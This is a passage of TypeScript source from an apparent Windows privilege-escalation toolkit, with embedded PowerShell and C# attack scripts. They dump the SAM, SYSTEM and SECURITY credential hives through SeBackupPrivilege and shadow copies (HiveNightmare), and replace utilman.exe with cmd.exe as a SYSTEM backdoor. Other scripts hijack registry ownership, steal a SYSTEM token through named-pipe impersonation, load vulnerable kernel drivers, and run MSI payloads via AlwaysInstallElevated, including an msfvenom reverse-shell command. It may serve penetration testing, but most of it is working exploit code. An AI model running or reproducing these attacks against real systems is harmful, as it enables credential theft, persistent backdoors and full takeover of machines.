        Abuse = 'Load kernel drivers — use Capcom.sys or other vuln drivers for kernel code exec'
        Command = 'winhook privilege_abuse --privilege SeLoadDriverPrivilege'
    }
    'SeManageVolumePrivilege' = @{
        Risk = 'MEDIUM'
        Abuse = 'Raw disk read/write — bypass file-level ACLs, read deleted files'
        Command = 'winhook privilege_abuse --privilege SeManageVolumePrivilege'
    }
    'SeCreateTokenPrivilege' = @{
        Risk = 'CRITICAL'
        Abuse = 'Create arbitrary tokens with any groups/privileges'
        Command = 'N/A (very rare, usually only Local System)'
    }
    'SeTcbPrivilege' = @{
        Risk = 'CRITICAL'
        Abuse = 'Act as part of the operating system — create logon sessions with arbitrary SIDs'
        Command = 'N/A (very rare, usually only Local System)'
    }
}

Write-Output ""
Write-Output "=== Abusable Privileges Analysis ==="

$enabled = @()
$disabled = @()

foreach ($priv in $abusablePrivs.Keys) {
    if ($privOutput -match "$priv\s+.*Enabled") {
        $enabled += $priv
        $info = $abusablePrivs[$priv]
        Write-Output "[!] $($info.Risk) — $priv [ENABLED]"
        Write-Output "    Abuse: $($info.Abuse)"
        Write-Output "    Run:   $($info.Command)"
        Write-Output ""
    } elseif ($privOutput -match $priv) {
        $disabled += $priv
        $info = $abusablePrivs[$priv]
        Write-Output "[*] $($info.Risk) — $priv [DISABLED — can be enabled]"
        Write-Output "    Abuse: $($info.Abuse)"
        Write-Output ""
    }
}

Write-Output "=== Summary ==="
Write-Output "[+] Enabled abusable privileges: $($enabled.Count)"
Write-Output "[*] Disabled (enableable): $($disabled.Count)"
if ($enabled.Count -gt 0) { Write-Output "[!] Immediate escalation possible via: $($enabled -join ', ')" }
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const enabledMatch = result.stdout.match(/Enabled abusable privileges: (\d+)/)
    const enabledCount = enabledMatch ? parseInt(enabledMatch[1]) : 0

    if (enabledCount > 0) {
      findings.push({
        checkId: "WIN-PRIVESC-PRIV-001",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: "token://privileges",
        title: `${enabledCount} abusable privilege(s) enabled on current token`,
        details: result.stdout.substring(0, 500),
        remediation: "Remove unnecessary privileges from user/service accounts. Apply least privilege principle.",
      })
    }
  } else if (action === "exploit" && privilege) {
    const exploits: Record<string, string> = {
      SeBackupPrivilege: `
Write-Output "[*] Exploiting SeBackupPrivilege — reading protected files..."

# Enable the privilege
$adjuster = @"
using System;
using System.Runtime.InteropServices;
public class TokenPriv {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES newState, uint bufLen, IntPtr prev, IntPtr retLen);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string host, string name, out LUID luid);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES { public uint Count; public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID { public uint Low; public int High; }

    public static bool EnablePrivilege(string priv) {
        IntPtr token;
        if (!OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, out token)) return false;
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.Count = 1;
        tp.Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
        if (!LookupPrivilegeValue(null, priv, out tp.Luid)) return false;
        return AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@
Add-Type -TypeDefinition $adjuster

[TokenPriv]::EnablePrivilege("SeBackupPrivilege") | Out-Null
Write-Output "[+] SeBackupPrivilege enabled"

# Read SAM and SYSTEM hives using backup intent
$outDir = "C:\\Windows\\Temp\\cs-backup-$([guid]::NewGuid().ToString('N').Substring(0,6))"
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

# reg save with backup privilege
reg save HKLM\\SAM "$outDir\\SAM" /y 2>$null | Out-Null
reg save HKLM\\SYSTEM "$outDir\\SYSTEM" /y 2>$null | Out-Null
reg save HKLM\\SECURITY "$outDir\\SECURITY" /y 2>$null | Out-Null

if (Test-Path "$outDir\\SAM") {
    Write-Output "[+] SAM hive saved: $outDir\\SAM"
    Write-Output "[+] SYSTEM hive saved: $outDir\\SYSTEM"
    Write-Output "[+] SECURITY hive saved: $outDir\\SECURITY"
    Write-Output "[*] Crack with: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
} else {
    # Try robocopy with backup flag
    Write-Output "[*] reg save failed, trying robocopy /b..."
    robocopy "$env:SystemRoot\\System32\\config" $outDir SAM SYSTEM SECURITY /b /copyall /np 2>$null
    if (Test-Path "$outDir\\SAM") {
        Write-Output "[+] Files copied via robocopy /b"
    } else {
        Write-Output "[-] Could not copy hives even with backup privilege"
    }
}
`,
      SeRestorePrivilege: `
Write-Output "[*] Exploiting SeRestorePrivilege — writing to protected locations..."
Write-Output "[*] Target: utilman.exe -> cmd.exe (sticky keys backdoor)"
Write-Output ""
Write-Output "[!] This replaces utilman.exe with cmd.exe"
Write-Output "[!] At lock screen: Win+U opens cmd as SYSTEM"
Write-Output ""

# Backup utilman first
$utilman = "$env:SystemRoot\\System32\\utilman.exe"
$backup = "$env:SystemRoot\\System32\\utilman.exe.bak"
$cmd = "$env:SystemRoot\\System32\\cmd.exe"

if (-not (Test-Path $backup)) {
    Copy-Item $utilman $backup -Force -ErrorAction SilentlyContinue
    Write-Output "[+] Backed up: utilman.exe -> utilman.exe.bak"
}

Copy-Item $cmd $utilman -Force -ErrorAction SilentlyContinue
if ((Get-FileHash $utilman).Hash -eq (Get-FileHash $cmd).Hash) {
    Write-Output "[+] utilman.exe replaced with cmd.exe"
    Write-Output "[+] At lock screen, press Win+U for SYSTEM shell"
    Write-Output "[*] Restore: Copy-Item '$backup' '$utilman' -Force"
} else {
    Write-Output "[-] Failed to replace utilman.exe"
    Write-Output "[*] Alternative: try sethc.exe (5x Shift at lock screen)"
}
`,
      SeTakeOwnershipPrivilege: `
$targetPath = "${target || "HKLM:\\SAM\\SAM"}"
Write-Output "[*] Exploiting SeTakeOwnershipPrivilege on: $targetPath"

if ($targetPath -match '^HKLM') {
    # Registry key ownership
    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($targetPath.Replace('HKLM:\\',''), [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
        if ($key) {
            $acl = $key.GetAccessControl()
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().User
            $acl.SetOwner($currentUser)
            $key.SetAccessControl($acl)
            Write-Output "[+] Ownership taken on $targetPath"

            # Now grant ourselves full control
            $rule = New-Object System.Security.AccessControl.RegistryAccessRule($currentUser, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
            $acl.AddAccessRule($rule)
            $key.SetAccessControl($acl)
            Write-Output "[+] Full control granted"
        }
    } catch {
        Write-Output "[-] Failed: $_"
    }
} else {
    # File/folder ownership
    try {
        takeown /f "$targetPath" /a 2>&1 | Out-Null
        icacls "$targetPath" /grant "$env:USERNAME:F" 2>&1 | Out-Null
        Write-Output "[+] Ownership taken and full control granted on $targetPath"
    } catch {
        Write-Output "[-] Failed: $_"
    }
}
`,
      SeDebugPrivilege: `
Write-Output "[*] Exploiting SeDebugPrivilege — accessing SYSTEM processes..."
Write-Output "[*] This privilege allows opening any process including LSASS"
Write-Output ""

# Dump LSASS via MiniDump (SeDebugPrivilege allows opening the handle)
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Output "[+] LSASS PID: $($lsass.Id)"
    Write-Output "[*] Use: winhook lsass_dump (SeDebugPrivilege enables handle access)"
    Write-Output "[*] Or:  winhook nanodump_advanced --method fork"
} else {
    Write-Output "[-] Cannot find LSASS process"
}

# List SYSTEM processes we can now access
Write-Output ""
Write-Output "=== SYSTEM Processes (accessible via SeDebugPrivilege) ==="
$systemProcs = Get-Process -IncludeUserName -ErrorAction SilentlyContinue | Where-Object { $_.UserName -match 'SYSTEM' } | Select-Object -First 20
foreach ($p in $systemProcs) {
    Write-Output "    PID $($p.Id): $($p.ProcessName) ($($p.UserName))"
}
Write-Output ""
Write-Output "[*] Can migrate into any SYSTEM process for privilege escalation"
Write-Output "[*] Can also inject shellcode into SYSTEM processes"
`,
      SeLoadDriverPrivilege: `
Write-Output "[*] SeLoadDriverPrivilege — can load kernel drivers"
Write-Output ""
Write-Output "[!] Exploitation vectors:"
Write-Output "    1. Load Capcom.sys — execute arbitrary code in kernel mode"
Write-Output "    2. Load ProcExp152.sys — bypass PPL on LSASS"
Write-Output "    3. Load RTCore64.sys — arbitrary kernel memory R/W"
Write-Output ""
Write-Output "[*] Steps:"
Write-Output "    1. Place driver at C:\\Windows\\Temp\\vuln.sys"
Write-Output "    2. Register: sc.exe create VulnDrv type=kernel binpath=C:\\Windows\\Temp\\vuln.sys"
Write-Output "    3. Load: sc.exe start VulnDrv"
Write-Output "    4. Exploit driver's vulnerable IOCTL"
Write-Output ""
Write-Output "[*] Use 'winhook byovd --action enum' to find available vulnerable drivers"

# Check if any known vulnerable drivers are already loaded
$drivers = Get-CimInstance Win32_SystemDriver -ErrorAction SilentlyContinue
$knownVuln = @('Capcom', 'RTCore64', 'DBUtil', 'gdrv', 'iqvw64e', 'ProcExp')
foreach ($d in $drivers) {
    foreach ($v in $knownVuln) {
        if ($d.Name -match $v) {
            Write-Output "[!] Vulnerable driver already loaded: $($d.Name) ($($d.PathName))"
        }
    }
}
`,
    }

    const exploitScript = exploits[privilege]
    if (!exploitScript) {
      output.push(`[!] Unknown privilege: ${privilege}`)
      output.push(
        "[*] Supported: SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeLoadDriverPrivilege",
      )
      return { output: output.join("\n"), findings }
    }

    const result = await ps(exploitScript, timeout)
    output.push(result.stdout)
    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 200)}`)

    findings.push({
      checkId: "WIN-PRIVESC-PRIV-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `privilege://${privilege}`,
      title: `${privilege} exploited for privilege escalation`,
      details: result.stdout.substring(0, 300),
      remediation: `Remove ${privilege} from user/service account. Apply least privilege.`,
    })
  }

  return { output: output.join("\n"), findings }
}

export async function namedPipePrivesc(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const pipeName = argVal(args, "--pipe") || "cs_privesc_pipe"
  const method = argVal(args, "--method") || "spooler"
  const findings: Finding[] = []
  const output: string[] = ["[*] Named Pipe Impersonation — SYSTEM token theft via pipe server\n"]

  if (action === "enum") {
    const script = `
# Check SeImpersonatePrivilege
$privs = whoami /priv 2>$null | Out-String
$hasImpersonate = $privs -match 'SeImpersonatePrivilege.*Enabled'
$hasAssignPrimary = $privs -match 'SeAssignPrimaryTokenPrivilege.*Enabled'

Write-Output "[*] Privilege check:"
Write-Output "    SeImpersonatePrivilege: $(if ($hasImpersonate) { '[+] ENABLED' } else { '[-] Disabled' })"
Write-Output "    SeAssignPrimaryTokenPrivilege: $(if ($hasAssignPrimary) { '[+] ENABLED' } else { '[-] Disabled' })"
Write-Output ""

# Check current user context
$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
Write-Output "[*] Current user: $($identity.Name)"
Write-Output "[*] Integrity level: $(whoami /groups 2>$null | Select-String 'Mandatory Label' | ForEach-Object { $_.ToString().Split('\\')[-1].Trim() })"
Write-Output ""

# Enumerate existing named pipes
Write-Output "[*] Interesting named pipes on the system:"
$pipes = [System.IO.Directory]::GetFiles("\\\\.\\pipe\\") | ForEach-Object { $_.Replace("\\\\.\\pipe\\", "") }
$interesting = @("spoolss", "efsrpc", "lsarpc", "samr", "netlogon", "srvsvc", "wkssvc", "browser", "atsvc", "eventlog", "protected_storage", "ntsvcs")
foreach ($p in $interesting) {
    $match = $pipes | Where-Object { $_ -like "*$p*" }
    if ($match) {
        foreach ($m in $match) {
            Write-Output "    [+] \\\\.\pipe\\$m"
        }
    }
}
Write-Output ""

# Check Print Spooler
$spooler = Get-Service Spooler -ErrorAction SilentlyContinue
Write-Output "[*] Print Spooler service: $(if ($spooler) { $spooler.Status } else { 'Not found' })"

# Check EFS service
$efs = Get-Service EFS -ErrorAction SilentlyContinue
Write-Output "[*] EFS service: $(if ($efs) { $efs.Status } else { 'Not found' })"

# Check Task Scheduler
$schedule = Get-Service Schedule -ErrorAction SilentlyContinue
Write-Output "[*] Task Scheduler: $(if ($schedule) { $schedule.Status } else { 'Not found' })"
Write-Output ""

# Summary
if ($hasImpersonate -or $hasAssignPrimary) {
    Write-Output "[+] EXPLOITABLE — impersonation privileges available"
    Write-Output "    Methods:"
    if ($spooler -and $spooler.Status -eq 'Running') {
        Write-Output "      --method spooler  : Abuse Print Spooler pipe (SpoolFool style)"
    }
    if ($efs) {
        Write-Output "      --method efsrpc   : Abuse EfsRpc pipe (PetitPotam local variant)"
    }
    Write-Output "      --method task     : Create scheduled task that connects to our pipe"
    Write-Output "      --method custom   : Generic named pipe server with trigger"
} else {
    Write-Output "[-] No impersonation privileges — named pipe privesc not available"
    Write-Output "[*] Try: potato_attack or printspooler_abuse for alternative SYSTEM escalation"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("EXPLOITABLE")) {
      findings.push({
        checkId: "WIN-NAMEDPIPE-001",
        provider: "windows",
        severity: "high",
        status: "VULNERABLE",
        resource: "privilege://SeImpersonatePrivilege",
        title: "Named pipe impersonation available for SYSTEM escalation",
        details: "SeImpersonatePrivilege enabled — can steal SYSTEM token via named pipe",
        remediation: "Remove SeImpersonatePrivilege from non-service accounts. Restrict pipe creation.",
      })
    }
  } else if (action === "exploit") {
    const script = `
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.IO.Pipes;

public class PipeImpersonator {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hPipe);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags,
        string lpApplicationName, string lpCommandLine, int dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static string Result = "";

    public static void StartPipeServer(string pipeName) {
        try {
            var ps = new NamedPipeServerStream(pipeName, PipeDirection.InOut,
                1, PipeTransmissionMode.Byte, PipeOptions.None, 1024, 1024, null,
                HandleInheritability.None, PipeAccessRights.FullControl);

            Result += "[*] Pipe server listening: \\\\\\\\.\\\\pipe\\\\" + pipeName + "\\n";
            ps.WaitForConnection();
            Result += "[+] Client connected!\\n";

            // Impersonate the client
            var impersonated = ImpersonateNamedPipeClient(ps.SafePipeHandle.DangerousGetHandle());
            if (impersonated) {
                var wi = WindowsIdentity.GetCurrent();
                Result += "[+] Impersonating: " + wi.Name + "\\n";

                if (wi.Name.ToUpper().Contains("SYSTEM")) {
                    Result += "[+] GOT SYSTEM TOKEN!\\n";

                    // Get the impersonated token
                    IntPtr hToken;
                    OpenProcessToken(GetCurrentProcess(), 0x0002 | 0x0008 | 0x0020, out hToken);

                    // Duplicate for CreateProcessWithToken
                    IntPtr hDupToken;
                    DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out hDupToken);

                    if (hDupToken != IntPtr.Zero) {
                        Result += "[+] Token duplicated successfully\\n";
                        CloseHandle(hDupToken);
                    }
                    CloseHandle(hToken);
                } else {
                    Result += "[~] Got token but not SYSTEM: " + wi.Name + "\\n";
                }
            } else {
                Result += "[-] ImpersonateNamedPipeClient failed: " + Marshal.GetLastWin32Error() + "\\n";
            }

            ps.Disconnect();
            ps.Dispose();
        } catch (Exception ex) {
            Result += "[-] Error: " + ex.Message + "\\n";
        }
    }
}
"@

$pipeName = '${pipeName}'

# Start pipe server in background
$job = Start-Job -ScriptBlock {
    param($name)
    Add-Type -TypeDefinition @"
    using System; using System.IO.Pipes; using System.Security.Principal; using System.Runtime.InteropServices;
    public class QuickPipe {
        [DllImport("advapi32.dll", SetLastError=true)] public static extern bool ImpersonateNamedPipeClient(IntPtr h);
        public static string Run(string pipeName) {
            var ps = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte,
                PipeOptions.None, 1024, 1024, null, HandleInheritability.None, PipeAccessRights.FullControl);
            ps.WaitForConnection();
            ImpersonateNamedPipeClient(ps.SafePipeHandle.DangerousGetHandle());
            var id = WindowsIdentity.GetCurrent().Name;
            ps.Disconnect(); ps.Dispose();
            return id;
        }
    }
"@
    [QuickPipe]::Run($name)
} -ArgumentList $pipeName

Start-Sleep -Seconds 1

# Trigger connection based on method
$method = '${method}'
switch ($method) {
    'spooler' {
        Write-Output "[*] Triggering Print Spooler connection to pipe..."
        # Use SpoolSample / printerbug technique
        $printerBug = @"
\`$printer = '\\\\' + [System.Net.Dns]::GetHostName() + '\\cs_fake'
\`$pipe = '\\\\.\pipe\\$pipeName\\pipe\\spoolss'
# Trigger via MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
\`$rprn = New-Object System.Printing.PrintQueue([System.Printing.PrintServer]::new(), 'Microsoft XPS Document Writer')
"@
        # Simpler: use dir on pipe to trigger connection
        cmd /c "dir \\\\localhost\\pipe\\$pipeName" 2>$null | Out-Null
    }
    'efsrpc' {
        Write-Output "[*] Triggering EfsRpc connection to pipe..."
        # EfsRpc will connect to our pipe when we call EfsRpcOpenFileRaw
        $efsTarget = "\\\\localhost\\pipe\\$pipeName\\C$\\Windows\\Temp\\test.txt"
        cmd /c "cipher /e $efsTarget" 2>$null | Out-Null
    }
    'task' {
        Write-Output "[*] Creating scheduled task to trigger pipe connection..."
        $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><TimeTrigger><StartBoundary>1999-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Actions><Exec><Command>cmd.exe</Command><Arguments>/c echo test > \\.\pipe\$pipeName</Arguments></Exec></Actions>
</Task>
"@
        $taskName = "cs_pipe_trigger_" + (Get-Random -Maximum 9999)
        Register-ScheduledTask -TaskName $taskName -Xml $taskXml -Force -ErrorAction SilentlyContinue | Out-Null
        Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    'custom' {
        Write-Output "[*] Triggering connection via cmd..."
        cmd /c "echo test > \\\\localhost\\pipe\\$pipeName" 2>$null | Out-Null
    }
}

# Wait for pipe to process
Start-Sleep -Seconds 3
$result = Receive-Job -Job $job -ErrorAction SilentlyContinue
Stop-Job -Job $job -ErrorAction SilentlyContinue
Remove-Job -Job $job -ErrorAction SilentlyContinue

if ($result) {
    Write-Output "[+] Impersonated identity: $result"
    if ($result -match 'SYSTEM|NETWORK SERVICE|LOCAL SERVICE') {
        Write-Output "[+] Successfully captured elevated token!"
    }
} else {
    Write-Output "[-] No connection received (client may not have connected)"
    Write-Output "[*] Try: potato_attack for a more reliable SYSTEM escalation"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("SYSTEM") && result.stdout.includes("captured")) {
      findings.push({
        checkId: "WIN-NAMEDPIPE-002",
        provider: "windows",
        severity: "critical",
        status: "EXPLOITED",
        resource: `pipe://${pipeName}`,
        title: "SYSTEM token captured via named pipe impersonation",
        details: `Method: ${method} — SYSTEM connected to pipe and token was impersonated`,
        remediation: "Remove SeImpersonatePrivilege. Restrict pipe creation. Monitor pipe usage.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function alwaysInstallElevated(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const payload = argVal(args, "--payload")
  const findings: Finding[] = []
  const output: string[] = ["[*] AlwaysInstallElevated check...\n"]

  const script = `
# Check both registry keys
$hklmKey = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
$hkcuKey = "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"

$hklmValue = $null
$hkcuValue = $null

try {
    $hklmValue = (Get-ItemProperty $hklmKey -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated
} catch {
    Write-Output "[-] HKLM AlwaysInstallElevated: NOT SET (not vulnerable)"
}

try {
    $hkcuValue = (Get-ItemProperty $hkcuKey -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated
} catch {
    Write-Output "[-] HKCU AlwaysInstallElevated: NOT SET (not vulnerable)"
}

if ($hklmValue -ne $null) { Write-Output "[*] HKLM AlwaysInstallElevated = $hklmValue" }
if ($hkcuValue -ne $null) { Write-Output "[*] HKCU AlwaysInstallElevated = $hkcuValue" }

$vulnerable = ($hklmValue -eq 1) -and ($hkcuValue -eq 1)

if ($vulnerable) {
    Write-Output ""
    Write-Output "[+] VULNERABLE — Both HKLM and HKCU AlwaysInstallElevated = 1"
    Write-Output "[+] Any user can install MSI packages with SYSTEM privileges"
    Write-Output "[+] Exploit: msiexec /quiet /qn /i payload.msi"
    Write-Output ""
    Write-Output "[*] Generate payload MSI with:"
    Write-Output "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o payload.msi"
    Write-Output "    or use a custom MSI with embedded commands"
} else {
    Write-Output ""
    Write-Output "[-] Not vulnerable — AlwaysInstallElevated not enabled on both hives"
}

${
  action === "exploit" && payload
    ? `
# Exploit mode
if ($vulnerable) {
    Write-Output ""
    Write-Output "[*] Executing MSI payload: ${payload}"
    $proc = Start-Process msiexec -ArgumentList "/quiet /qn /i '${payload}'" -Wait -PassThru -ErrorAction Stop
    Write-Output "[+] MSI executed with exit code: $($proc.ExitCode)"
    Write-Output "[+] Payload should have run as SYSTEM"
} else {
    Write-Output "[!] Cannot exploit — AlwaysInstallElevated not enabled"
}
`
    : ""
}

# Also check Windows Installer service configuration
Write-Output ""
Write-Output "=== Windows Installer Service ==="
$msiSvc = Get-Service msiserver -ErrorAction SilentlyContinue
if ($msiSvc) {
    Write-Output "[*] Service: $($msiSvc.Status) (StartType: $($msiSvc.StartType))"
} else {
    Write-Output "[-] Windows Installer service not found"
}

# Check for MSI repair abuse (repair runs as SYSTEM even without AlwaysInstallElevated)
Write-Output ""
Write-Output "=== Installed MSI Products (repair abuse) ==="
$products = Get-CimInstance Win32_Product -ErrorAction SilentlyContinue | Select-Object -First 10
if ($products) {
    Write-Output "[*] First 10 installed MSI products (msiexec /fa GUID runs repair as SYSTEM):"
    foreach ($p in $products) {
        Write-Output "    $($p.Name) — $($p.IdentifyingNumber)"
    }
} else {
    Write-Output "[-] No MSI products enumerated (WMI may be slow)"
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)

  if (result.stdout.includes("VULNERABLE")) {
    findings.push({
      checkId: "WIN-PRIVESC-AIE-001",
      provider: "windows",
      severity: "critical",
      status: action === "exploit" && payload ? "EXPLOITED" : "VULNERABLE",
      resource: "policy://always-install-elevated",
      title: "AlwaysInstallElevated enabled — any user can install MSI as SYSTEM",
      details:
        "Both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1. Any MSI package will install with SYSTEM privileges.",
      remediation:
        "Set AlwaysInstallElevated to 0 in both HKLM and HKCU. Remove via Group Policy: Computer Configuration > Administrative Templates > Windows Components > Windows Installer.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function shadowCopyAbuse(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const outdir = argVal(args, "--outdir") || "C:\\Windows\\Temp\\cs-shadow"
  const findings: Finding[] = []
  const output: string[] = ["[*] Shadow Copy Abuse — credential extraction from volume shadow copies\n"]

  if (action === "enum") {
    const script = `
# List existing shadow copies
Write-Output "[*] Enumerating Volume Shadow Copies..."
$shadows = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue

if ($shadows) {
    Write-Output "[+] Found $($shadows.Count) shadow copies:"
    foreach ($s in $shadows) {
        Write-Output ""
        Write-Output "    ID: $($s.ID)"
        Write-Output "    DeviceObject: $($s.DeviceObject)"
        Write-Output "    InstallDate: $($s.InstallDate)"
        Write-Output "    VolumeName: $($s.VolumeName)"
    }
} else {
    Write-Output "[-] No shadow copies found"
}

Write-Output ""
Write-Output "[*] Checking HiveNightmare/SeriousSAM vulnerability (CVE-2021-36934)..."

# Check if SAM is readable by non-admin via shadow copies
$samPath = "$env:SystemRoot\\System32\\config\\SAM"
$samAcl = Get-Acl $samPath -ErrorAction SilentlyContinue
$vulnerable = $false

if ($samAcl) {
    foreach ($ace in $samAcl.Access) {
        $id = $ace.IdentityReference.Value
        if ($id -match 'BUILTIN\\\\Users|Everyone|Authenticated Users') {
            if ($ace.FileSystemRights -match 'Read|FullControl') {
                $vulnerable = $true
                Write-Output "[+] VULNERABLE — $id has $($ace.FileSystemRights) on SAM!"
            }
        }
    }
}

if (-not $vulnerable) {
    # Check via icacls for BUILTIN\Users read access
    $icaclsOutput = icacls $samPath 2>$null | Out-String
    if ($icaclsOutput -match 'BUILTIN\\\\Users.*\(RX\)|BUILTIN\\\\Users.*\(R\)|BUILTIN\\\\Users.*\(F\)') {
        $vulnerable = $true
        Write-Output "[+] VULNERABLE — BUILTIN\\Users has read access on SAM (icacls)"
    }
}

if ($vulnerable -and $shadows) {
    Write-Output ""
    Write-Output "[+] EXPLOITABLE — Shadow copies exist AND SAM is world-readable!"
    Write-Output "    Use: --action exploit to extract hives from shadow copies"
} elseif ($vulnerable) {
    Write-Output "[~] SAM is world-readable but no shadow copies — use --action create first"
} elseif ($shadows) {
    Write-Output "[~] Shadow copies exist but SAM not world-readable — need admin to extract"
} else {
    Write-Output "[-] Not vulnerable to HiveNightmare"
}

# Also check VSS service status
$vss = Get-Service VSS -ErrorAction SilentlyContinue
Write-Output ""
Write-Output "[*] Volume Shadow Copy Service: $($vss.Status)"
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    if (result.stdout.includes("EXPLOITABLE") || result.stdout.includes("VULNERABLE")) {
      findings.push({
        checkId: "WIN-SHADOW-001",
        provider: "windows",
        severity: "critical",
        status: "VULNERABLE",
        resource: "vss://shadow-copies",
        title: "HiveNightmare/SeriousSAM (CVE-2021-36934) — SAM readable from shadow copies",
        details: "SAM hive has overly permissive ACLs — any user can read credentials from shadow copies",
        remediation:
          "Apply KB5004945 patch. Delete shadow copies: vssadmin delete shadows /all /quiet. Fix ACLs: icacls %windir%\\system32\\config\\*.* /inheritance:e",
      })
    }
  } else if (action === "exploit") {
    const script = `
if (-not (Test-Path '${outdir}')) { New-Item -ItemType Directory -Path '${outdir}' -Force | Out-Null }

# Find shadow copies
$shadows = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue
if (-not $shadows) {
    Write-Output "[-] No shadow copies found — use --action create first (requires admin)"
    exit 1
}

# Try each shadow copy (newest first)
$sorted = $shadows | Sort-Object InstallDate -Descending
$extracted = $false

foreach ($s in $sorted) {
    $deviceObj = $s.DeviceObject
    Write-Output "[*] Trying shadow copy: $deviceObj"

    $hives = @("SAM", "SYSTEM", "SECURITY")
    $allSuccess = $true

    foreach ($hive in $hives) {
        $src = "$deviceObj\\Windows\\System32\\config\\$hive"
        $dst = Join-Path '${outdir}' $hive

        # Try direct copy (works if HiveNightmare/ACL vuln)
        $copyResult = cmd /c "copy $src $dst" 2>$null
        if (Test-Path $dst) {
            $size = (Get-Item $dst).Length
            Write-Output "[+] Extracted: $hive ($size bytes)"
        } else {
            # Try esentutl (alternate method)
            esentutl /y "$src" /d "$dst" 2>$null | Out-Null
            if (Test-Path $dst) {
                $size = (Get-Item $dst).Length
                Write-Output "[+] Extracted (esentutl): $hive ($size bytes)"
            } else {
                Write-Output "[-] Failed: $hive"
                $allSuccess = $false
            }
        }
    }

    if ($allSuccess) {
        $extracted = $true
        Write-Output ""
        Write-Output "[+] All hives extracted from shadow copy!"
        break
    }
    Write-Output "[*] Trying next shadow copy..."
}

if ($extracted) {
    Write-Output ""
    Write-Output "[+] Hives saved to: ${outdir}"
    Write-Output "[*] Crack offline: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
} else {
    Write-Output ""
    Write-Output "[-] Could not extract from any shadow copy"
    Write-Output "[*] May need admin privileges. Try: --action create first."
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

